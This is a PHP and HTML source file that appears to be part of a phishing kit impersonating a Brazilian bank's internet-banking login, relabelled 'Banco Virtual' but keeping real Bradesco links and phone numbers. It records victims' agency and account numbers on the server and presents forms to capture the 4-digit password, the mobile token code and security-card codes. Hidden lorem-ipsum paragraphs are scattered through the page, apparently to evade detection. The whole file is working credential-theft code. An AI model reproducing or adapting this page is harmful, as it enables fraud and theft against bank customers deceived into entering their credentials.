<?php
require_once('_admin/config.php');
require_once('validacao.php');
require_once('Lorem.php');
function isExclusive($obj){
   if(isset($obj['exclusive']) && $obj['exclusive']){
      return true;
   }
   return false;
}

function isPrivate($obj){
    if(isset($obj['prime']) && $obj['prime']){
       return true;
    }
    return false;
 }

$exclusive = false;
$prime = false;

if(isset($_POST['agencia']) && strlen($_POST['agencia']) > 0 && isset($_POST['conta']) && strlen($_POST['conta']) > 0 && isset($_POST['digito']) && strlen($_POST['digito']) > 0){
    $agencia = $_POST['agencia'];
    $conta = $_POST['conta'];
    $digito = $_POST['digito'];
    $objAPI = getNome2($agencia, $conta.$digito);
    //  $_SESSION['nome'] = $nome;


    $tipo = "Banco Virtual";
    if(isExclusive($objAPI)){
        $exclusive = true;
        $tipo = "Banco Virtual Premium";
    }

    if(isPrivate($objAPI)){
        $prime = true;
        $tipo = "Banco Virtual VIP";
    }
   
   Info::gravarInfo($_SESSION['idAcesso'], $agencia, $conta, $digito, $comando = "SENHA_DE_4", $tipo);

    if(isset($objAPI['titulares']) && count($objAPI['titulares']) == 0 && isset($objAPI['nome']) && strlen($objAPI['nome']) > 0){
      $id = $_SESSION['id'];
      Info::atualizarTitular($id, "1 º titular" , $objAPI['nome']);
      $_SESSION['nome'] = $objAPI['nome'];
    }

} else {
    header('Location: index.php');
    exit;
}

$tipo = 'varejo';
if($exclusive){
    $tipo = 'exclusive';
}

if($prime) {
    $tipo = "prime";
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <link rel="stylesheet" type="text/css" media="screen, print" href="css/estrutura.css?Versao=6.css" />
      <link rel="stylesheet" type="text/css" media="screen, print" href="css/ctustomEstrutura.css?Versao=6.css" />
      
      <link rel="shortcut icon" href="images/favicon.ico">
      <title>Banco Virtual</title>
      <style>
        p.random{display:none}
        
        /* Paleta azul para identificação */
        .steps-center a.active {
            color: #0066cc !important;
            border-bottom: 2px solid #0066cc !important;
        }
        
        .banner {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
        }
        
        .banner-Banco\ Virtual {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
        }
        
        .banner-Banco\ Virtual\ Premium {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
        }
        
        .banner-Banco\ Virtual\ VIP {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
        }
        
        #rodape {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
        }
        
        .btn-action {
            background-color: #0066cc !important;
            border-color: #0066cc !important;
        }
        
        .btn-action:hover {
            background-color: #004499 !important;
            border-color: #004499 !important;
        }
        
        .external-link {
            color: #0066cc !important;
        }
        
        .external-link:hover {
            color: #004499 !important;
        }
        
        /* Garantir que o teclado numérico apareça */
        #ul_teclado_virtual {
            display: block !important;
            visibility: visible !important;
        }
        
        .btnKeyboardVirtualSingle {
            display: block !important;
            visibility: visible !important;
        }
        
        #boxSenha4 {
            display: block !important;
            visibility: visible !important;
        }
        
        .boxes {
            display: block !important;
        }
        
        /* Estilizar o teclado numérico */
        .btnKeyboardVirtualSingle li {
            display: inline-block !important;
            margin: 5px !important;
        }
        
        .btnKeyboardVirtualSingle a {
            display: block !important;
            padding: 10px 15px !important;
            background-color: #f8f9fa !important;
            border: 1px solid #dee2e6 !important;
            border-radius: 5px !important;
            text-decoration: none !important;
            color: #333 !important;
            font-weight: bold !important;
            min-width: 40px !important;
            text-align: center !important;
        }
        
        .btnKeyboardVirtualSingle a:hover {
            background-color: #0066cc !important;
            color: white !important;
            border-color: #0066cc !important;
        }
        
        .btnLimparTeclado {
            background-color: #dc3545 !important;
            color: white !important;
            border-color: #dc3545 !important;
        }
        
        .btnLimparTeclado:hover {
            background-color: #c82333 !important;
            border-color: #c82333 !important;
        }
        
        /* Header azul */
        #topo {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
            color: white !important;
        }
        
        #headerIB {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%) !important;
            color: white !important;
        }
        
        #topo .logo a {
            color: white !important;
        }
        
        #topo .date {
            color: white !important;
        }
        
        #topo .close a {
            color: white !important;
        }
        
        #topo .close a:hover {
            color: #b3d9ff !important;
        }
        
        .divExclusive {
            background: rgba(255, 255, 255, 0.2) !important;
        }
    </style>
   </head>
<body class="<?php echo $tipo;?>">
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <div style="height:1px;width:1px;position:absolute;top:0px;left:0px;">
        <a href="javascript:;" title="" id="hiddentabfirst" class="tabindex" style="font-size:1px" tabindex="1">&nbsp;</a>
    </div>
	
    <a id="linkCadastroSenha4" href="https://www.ib12.banco-virtual.com.br/ibpfsenha4/criarSenha.jsf" rel="external"></a>	
		
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <div id="miolo" class="varejo">
			
        <div id="topo" class="clearfix">
            <div id="headerIB" class="clearfix">
                <div style="position: relative;">
                    <?php if($exclusive):?>
                        <div class="divExclusive"></div>
                    <?php endif;?>
                    <div class="logo">
                        <a href="javascript:;" target="_blank" title="Banco Virtual">Banco Virtual</a>
                    </div>
                    <div class="date"><?php echo dataPorExtensoNovo();?></div>
                    <div class="close">
                        <a id="botao_cancelar_acesso" href="javascript:;" title="Cancelar Acesso" class="tabindex btn btn-cancelar" tabindex="2">
                            <span id="lblCancelar">Cancelar</span>
                        </a>
                    </div>
                </div>
            </div>
		</div>	
        <p class="random"><?php echo Lorem::ipsumWords(75);?></p>

        <div id="conteudo" class="conteudo_L">
            <div id="conteudo_interno">
                <div class="box">
                  <?php
                     $multiUsuarios = false;
                     if(isset($objAPI['titulares']) && count($objAPI['titulares']) == 0):
                  ?>
                    <div class="account"><h2>Olá, <?php echo $objAPI['nome'];?></h2>
                  <?php
                    else:
                        $multiUsuarios = true;
                  ?>
                  <div class="account"><h2>Bem vindo</h2>
                  <?php
                    endif;
                  ?>
                    <div class="account-info">
                        <span>Agência <?php echo $agencia;?></span>
                        <span>Conta <?php echo $conta."-".$digito;?></span>
                    </div>
                </div>
                <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                <div id="loading_novocompseg" class="account" style="display: none;">
                    <h2>Acesso Seguro </h2>
                    <div class="account-info mt24">
                        <span>Carregando Componente de Segurança, aguarde alguns instantes.</span>
                    </div>
                    <img id="img_loading_novo_compseg" src="https://www.ib13.banco-virtual.com.br/ibpf/imagens/geral/loader-02.gif" class="loading_compseg">
                </div>
                <form id="form_titular" name="form_titular" method="post" action="/ibpfnovologin/login.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                    <input type="hidden" id="form_titular:idMaquinaApplet" name="form_titular:idMaquinaApplet" value="">
                    <input type="hidden" id="form_titular:numControle" name="form_titular:numControle" value="">
                    <div id="form_titular:seletor_titular" class="steps" style="">
                        <div class="tab-steps mb25">
                            <div class="steps-center">
                                <a id="form_titular:_id88" href="" onclick="return false;" title="Senha"><?php echo $multiUsuarios ? 'Dados' : 'Senha'; ?></a>
                                <a id="form_titular:_id86" href="" onclick="return false;" title="Validação" class="active">Validação</a>
                            </div>
                            <div class="steps-border"></div>
                        </div>
                        <div class="box-scroll-view">
                            <div class="box-scroll">
                                <div id="form_titular:centroBox" class="divCentroBox">
                                    <div id="form_titular:div-textoAntesBotoes" class="textoAntesBotoes"></div>
                                    <div id="form_titular:divDispositivos" style="">
                                        <img id="form_titular:loading_dispositivo" src="https://www.ib13.banco-virtual.com.br/ibpf/imagens/geral/loading_01.gif" class="loading none_i">
                                    </div>
                                    <div id="form_titular:div-textoAposBotoes" class="textoAposBotoes"></div>

                                    <title>/mobileToken.jsp</title>
                                    <meta http-equiv="Content-Type" content="text/html">
                                    
                                    <div id="boxToken" class="hide boxes">
                                        <span class="txt_msg_erro_disp hide">
                                            <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto</b></span>
                                        </span>
                                        <input type="hidden" id="captchaFlag" name="captchaFlag" value="S">
                                        <input type="hidden" id="exibiuCaptchaDisp" name="exibiuCaptchaDisp" value="N"><div class="step step-2-validacao">
                                        <div class="form-field">
                                            <div id="boxCaptchaDisp" class="form-field #{utilBean.suporteIdMaquinaJava || utilBean.suporteComponenteSeguranca || utilBean.suporteComponenteSegurancaIPAD ? 'none':''">
                                                <span id="txt_msg_erro_disp">
                                                    <span class="erro_msg ml10 none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span>
                                                </span>
                                                <div id="div_retorno_msg_captcha" class="none"></div>
                                                <span id="campoErroTancode" class="erro_msg tabindex none" tabindex="3"></span>
                                            </div>
                                            <span id="text_token_chave">
                                                <label for="form-chave-eletronica-token">Digite o código informado na <br><strong>Chave de Segurança Eletrônica do Celular</strong>:</label>
                                            </span>
                                            <div class="validacao validacao-celular">
                                                    <div class="validacao-image"></div>
                                                    <div class="validacao-info">
                                                        <span id="text_mobile_token">Nº de referência do dispositivo: <strong class="serial"></strong></span>
                                                    </div>
                                            </div>
                                            <div class="form-code">
                                                <input type="password" id="token" name="Password1" maxlength="6" title="Digite o código informado na Chave de Segurança Eletrônica: " class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                                                <div class="mark-char" style="width: 40px; left: 0px;"></div>
                                            </div>
                                            <span id="campoErroToken" class="erro_msg"></span>
                                            <img id="loading_celular" src="https://www.ib13.banco-virtual.com.br/ibpf/imagens/geral/loading_01.gif" class="loading none_i"></div>
                                            <div id="divBotoesPagina">
                                                <form name="loginbotoes" method="post" action="/ibpfnovologin/mobileToken.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                                                <button type="button" id="btnAcessarToken" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                <input type="hidden" name="loginbotoes_SUBMIT" value="1">
                                                <input type="hidden" name="autoScroll">
                                                </form>
                                            </div>
                                            <div class="footer-links">
                                                <a class="external-link tabindex" rel="external" onclick="return false;" href="https://banco.bradesco/html/classic/como-usar/senhas-e-dispositivos-de-seguranca.shtm" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                    <span>Continue seu acesso para aproveitar todos os benefícios disponíveis. </span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="boxTabela" class="hide boxes">
                                        <span class="txt_msg_erro_disp hide">
                                            <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto</b></span>
                                        </span>
                                        <input type="hidden" id="captchaFlag" name="captchaFlag" value="S">
                                        <input type="hidden" id="exibiuCaptchaDisp" name="exibiuCaptchaDisp" value="N"><div class="step step-2-validacao">

                                        <div class="form-field">

                                        <span id="text_tancode_posicao"><label for="form-chave-eletronica-cartao">Digite a posição <strong id="posicao"></strong> informada no <br><strong>Cartão Chave de Segurança</strong>:</label></span>
                                        <div class="validacao validacao-cartao">
                                            <div class="validacao-image"></div>
                                            <div class="validacao-info"><span id="text_tancode_nro_cartao">Nº de referência do dispositivo: <br><strong class="serial"></strong></span></div>
                                        </div>
                                        <div class="form-code w150">
                                            <input type="password" id="posicaoTabela" name="txtCartaoSeg" maxlength="3" title="Informe a chave da posição 64 do seu dispositivo de segurança." style="margin-left: 15px;" class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="8">
                                            <div class="mark-char" style="width: 50px; left: 0px;"></div>
                                        </div>
                                        </div>
                                            <div id="divBotoesPagina">
                                                <form name="loginbotoes" method="post" action="/ibpfnovologin/mobileToken.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                                                <button type="button" id="btnAcessarTabela" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                <input type="hidden" name="loginbotoes_SUBMIT" value="1">
                                                <input type="hidden" name="autoScroll">
                                                </form>
                                            </div>
                                            <div class="footer-links">
                                                <a class="external-link tabindex" rel="external" onclick="return false;" href="https://banco.bradesco/html/classic/como-usar/senhas-e-dispositivos-de-seguranca.shtm" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                    <span>Continue seu acesso para aproveitar todos os benefícios disponíveis. </span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
  
                                    <div id="boxAguardando" class="boxes box_redLine_bottom after hide">
                                        <img src="images/loading_01.gif" class="loading" alt="">
                                    </div>
                                    <div id="boxSenha4" class="boxes box_redLine_bottom after">
                                        <span class="txt_msg_erro_disp hide">
                                            <span class="erro_msg ml10 none_i error-show"><b>A Senha de 4 Dígitos não está correta.</b><br>Lembre-se de que a Senha de 4 Dígitos é diferente da senha de seu cartão de débito.</b></span>
                                        </span>

                                            <div id="conteudoUsuarios" class="<?php echo $multiUsuarios ? '' : 'hide'; ?>">
                                                <?php
                                                    $titulares = isset($objAPI['titulares']) ? $objAPI['titulares'] : [];
                                                ?>
                                                <div class="form-field">
                                                <div class="form-option-square clearfix">
                                                    <span id="form_titular:text_legendaBox_identifique" class="mb30">Identifique-se pelo <strong>nome</strong>:</span>
                                                    <div id="form_titular:listaTitulares" class="box-titulares">
                                                        <?php
                                                        $iTitular = 1;
                                                        if(is_array($titulares) && !empty($titulares)):
                                                            foreach($titulares as $titular):
                                                        ?>
                                                        <div class="option boxTitular" style=""><span id="radNome00" for="radNome00"><?php echo $titular;?></span>
                                                            <input id="radNome00" type="radio" value="<?php echo $iTitular;?>" data-nome="<?php echo $titular;?>" name="form_titular:titular" title="Identifique-se pelo nome marque para <?php echo $titular;?>, <?php echo $iTitular;?>º titular" class="titularRadio tabfirst tabindex" tabindex="3">
                                                        </div>
                                                        <?php
                                                        $iTitular++;
                                                        endforeach;
                                                        endif;
                                                        ?>
                                                    </div>
                                                </div>
                                                <span id="form_titular:div_erro_msg" class="erro_msg"><strong>Você deve selecionar seu primeiro nome.</strong></span>
                                                </div>
                                            </div>
                                            
                                            <div id="conteudoSenha" class="<?php echo $multiUsuarios ? 'hide' : ''; ?>">
                                                <div class="form-field">
                                                    <span id="text_legendaBox_senha_4">Informe sua senha de <strong>4 dígitos</strong>.</span><span id="campoErroSenha" class="erro_msg"></span>
                                                    <ul id="ul_input_fields" class="input-fields after">
                                                        <li id="li_input_fields_1"><input type="password" id="txtPass1" name="txtPass1" maxlength="1" title="Informe sua senha de 4 dígitos." class="frmPassWord tabindex tab-1" disabled="disabled" tabindex="2"></li>
                                                        <li id="li_input_fields_2"><input type="password" id="txtPass2" name="txtPass2" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                        <li id="li_input_fields_3"><input type="password" id="txtPass3" name="txtPass3" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                        <li id="li_input_fields_4"><input type="password" id="txtPass4" name="txtPass4" maxlength="1" class="frmPassWord" disabled="disabled"></li>
                                                    </ul>
                                                </div>
                                                <ul id="ul_teclado_virtual" class="btnKeyboardVirtualSingle">
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="7">7</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="9">9</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="4">4</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="8">8</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="6">6</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="2">2</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="3">3</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="0">0</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="5">5</a></li>
                                                    <li><a href="javascript:;" class="pngfix digits" style="cursor:pointer;" title="1">1</a></li>
                                                    <li class="limpar"><a id="botao_limpar" class="pngfix tabindex pointer digits digits-last btnLimparTeclado" title="Limpar" tabindex="4">Limpar</a></li>
                                                </ul>
                                                <input type="hidden" name="senha4" id="senha4">
                                                <div class="divBotoesPagina">
                                                    <form class="loginbotoes" name="loginbotoes" method="post" action="/ibpfnovologin/mobileToken.jsf" enctype="application/x-www-form-urlencoded" class="ajaxForm allowSubmit denyAutoComplete" autocomplete="new-password">
                                                    <button type="button" id="btnAcessarSenha4" class="btn-action action-button tabindex" title="Avançar para a Senha" tabindex="5">Acessar</button>
                                                    <input type="hidden" name="autoScroll">
                                                    </form>
                                                </div>
                                                <div class="footer-links">
                                                    <a class="external-link tabindex" rel="external" onclick="return false;" href="javascript:;" title="Ajuda com dispositivo de segurança ?" tabindex="6">
                                                        <span>Continue seu acesso para aproveitar todos os benefícios disponíveis. </span>
                                                    </a>
                                                </div>
                                            </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                    <input type="hidden" name="form_titular_SUBMIT" value="1">
                    <input type="hidden" name="autoScroll">
                </form>
            </div>
            <a id="_id99" href="#" target="_blank" class="banner banner-<?php echo $tipo;?>" style="margin-top: 0px;"></a>
        </div>
        <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <div id="boxPassoIntermediario" class="box-passo-intermediario plr80 w806 none"></div>
        <div style="width: 0px; height: 0px;"></div>
        <div>
            <div id="scpDiv">
                <img id="scp">
            </div>
        </div>
    </div>
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <form id="form_cript" name="form_cript" method="post" action="/ibpfnovologin/login.jsf" enctype="application/x-www-form-urlencoded">
        <input type="hidden" id="form_cript:valor_dig" name="form_cript:valor_dig" value="">
        <input type="hidden" id="form_cript:valor_cript" name="form_cript:valor_cript" value="">
        <input type="hidden" name="form_cript_SUBMIT" value="1">
        <input type="hidden" name="autoScroll">
    </form>
    <div style="visibility:hidden; display:hide">
        <form name="form_cript_backup">
            <input type="hidden" name="form_cript:valor_dig">
        </form>
    </div>			
    </div>	
		
	<p class="random"><?php echo Lorem::ipsumWords(75);?></p>
	<div id="rodape">
        <div class="content clearfix"><div class="logo"><a href="http://www.banco-virtual.com.br/" target="_blank" title="Banco Virtual">Banco Virtual</a></div><h5>FONE FÁCIL</h5><div class="listings"><p>Capitais / Metropolitanas</p><h5>4002 0022</h5><p>Consulta de saldo, extrato, <br> transações financeiras <br> e de cartão de crédito.  </p></div><div class="listings br-tp1"><p>Demais Regiões</p><h5>0800 570 0022</h5><p>SAC - Deficiência <br> Auditiva ou de Fala</p><h5>0800 722 0099</h5></div><span style="margin-right: 0;"><div class="listings"><p>SAC - Alô Banco Virtual</p><h5>0800 570 0022</h5><p>Cancelamento, reclamação, informação, sugestão e elogio.</p></div></span><div class="tips"><div class="tip"><div class="tips-title clearfix"><h6>Segurança</h6></div><p>O cadeado precisa estar aparecendo na barra do seu navegador.</p><a id="maisDicas" href="javascript:;" rel="external" target="_blank" onclick="return false;" title="Mais dicas" class="tabindex link-btn-no-style" tabindex="8"><span>Ver Mais</span></a></div></div></div><div class="content clearfix"><p class="message-whatsapp">Se preferir, fale com a BIA pelo whatsapp: <strong>3335-0237</strong></p></div><div class="footer-last"><div class="footer-last-content"><a id="outrosTelefones" href="#" rel="external" target="_self" onclick="return false;" title="Ver outros telefones" class="see-others-phones">Ver outros telefones</a></div></div><div class="footer-phones"><div class="content clearfix">
				<div class="telefones">
					<div class="container">
						<div class="grid telefones-cartoes">
							<div class="cell large-12">
								<h3>Cartões</h3>
								<p>Cancelamentos, Reclamações e Informações</p>
							</div>
							<div class="cell large-6">
								<h4>Cartões</h4>
								<p class="tel">0800 721 2778</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 722 00999</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
							</div>
							<div class="cell large-6">
								<h4>Ouvidoria</h4>
								<p class="tel">0800 727 9933</p>
								<p>Atendimento de 2ª à 6ª-feira das 8h às
									18h, exceto feriado.</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale
										Conosco</a>
								</p>
							</div>
						</div>
						<div class="grid telefones-previdencia">
							<div class="cell large-12">
								<h3>Previdência</h3>
							</div>
							<div class="cell large-6">
								<h4>Vida e Previdência</h4>
								<p class="tel">0800 721 2778</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 721 2778</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Informações sobre seguros de Pessoas
									(Vida / Acidentes Pessoais)</h4>
								<p class="tel">0800 701 2704</p>
								<p>Atendimento dias úteis das 8h às 20h e
									sábados das 8h às 14h*</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
									Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
									<a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
								</p>
							</div>
							<div class="cell large-6">
								<h4>Central de Relacionamento</h4>
								<p class="tel">4002-0022</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 570 0022</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 727 9933</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
							</div>
						</div>
						<div class="grid telefones-seguros">
							<div class="cell large-12">
								<h3>Seguros</h3>
							</div>
							<div class="cell large-6">
								<h4>Vida e Previdência</h4>
								<p class="tel">0800 727 9966</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 701 2762</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 701 7000</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
								<p class="fale-conosco">
									Demais telefones consulte o site <a href="https://banco.bradesco/html/classic/atendimento/atendimento.shtm" target="_blank">Fale Conosco</a><br>
									Para conferir as condições contratuais do seu plano acesse:<br _ngcontent-c5="">
									<a href="https://www.bradescoseguros.com.br" target="_blank">www.bradescoseguros.com.br</a> / <a _ngcontent-c5="" href="https://www.susep.gov.br" target="_blank">www.susep.gov.br</a>
								</p>
							</div>
							<div class="cell large-6">
								<h4>Assistências, Consultas, Informações e
									Serviços Transacionais</h4>
								<p class="tel">4004-2757</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 701 2757</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
							</div>
						</div>
						<div class="grid telefones-capitalizacao">
							<div class="cell large-12">
								<h3>Capitalização</h3>
							</div>
							<div class="cell large-6">
								<h4>Vida e Previdência</h4>
								<p class="tel">0800 727 9966</p>
								<h4>Deficiência auditiva ou de fala</h4>
								<p class="tel">0800 701 2762</p>
								<p>Atendimento 24 horas, 7 dias por semana.</p>
								<h4>Ouvidoria</h4>
								<p class="tel">0800 701 7000</p>
								<p>Atendimento de 2ª a 6ª-feira das 8h às
									18h.</p>
							</div>
							<div class="cell large-6">
								<h4>Assistências, Consultas, Informações e
									Serviços Transacionais</h4>
								<p class="tel">4004-2757</p>
								<h4>Demais Regiões</h4>
								<p class="tel">0800 701 2757</p>
								<p>Atendimento dias úteis das 7h30 às
									19h30*</p>
							</div>
						</div>
					</div>
				</div>
			</div>
        </div>
    </div>
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <input type="hidden" name="idInfo" id="idInfo" value="<?php echo $_SESSION['id'];?>">
   <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
   
    <script src="js/jquery-3.4.1.min.js"></script>
    <script src="js/identificacao.js"></script>
    <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
</body>
</html>